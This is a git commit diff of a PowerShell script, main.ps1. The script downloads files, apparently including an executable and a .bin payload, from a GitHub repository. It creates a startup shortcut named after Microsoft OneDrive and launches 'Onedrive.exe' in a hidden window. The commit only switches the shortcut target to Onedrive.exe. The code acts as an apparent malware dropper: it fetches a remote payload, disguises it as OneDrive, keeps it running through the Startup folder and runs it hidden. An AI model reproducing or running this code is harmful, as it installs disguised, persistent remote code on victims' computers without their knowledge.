e1d8e9aac8d9b37c4b2293f6eae162e02b6da8e9
sys!!+root <79191180+Algorithm99root@users.noreply.github.com>
2025-07-09 21:53:07 +0100

    Update main.ps1

--- main.ps1
+++ main.ps1
@@ -3,5 +3,5 @@ iwr "https://raw.githubusercontent.com/Algorithm99root/russian/refs/heads/main/O
 iwr "https://raw.githubusercontent.com/Algorithm99root/russian/refs/heads/main/sys_root.bin" -OutFile "$dst\sys_root.bin"
 $lnk = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Onedrive.lnk"
 $s = New-Object -ComObject WScript.Shell
-$l = $s.CreateShortcut($lnk); $l.TargetPath = "$dst\main.exe"; $l.WindowStyle = 7; $l.Save()
+$l = $s.CreateShortcut($lnk); $l.TargetPath = "$dst\Onedrive.exe"; $l.WindowStyle = 7; $l.Save()
 Start-Process "$dst\Onedrive.exe" -WindowStyle Hidden
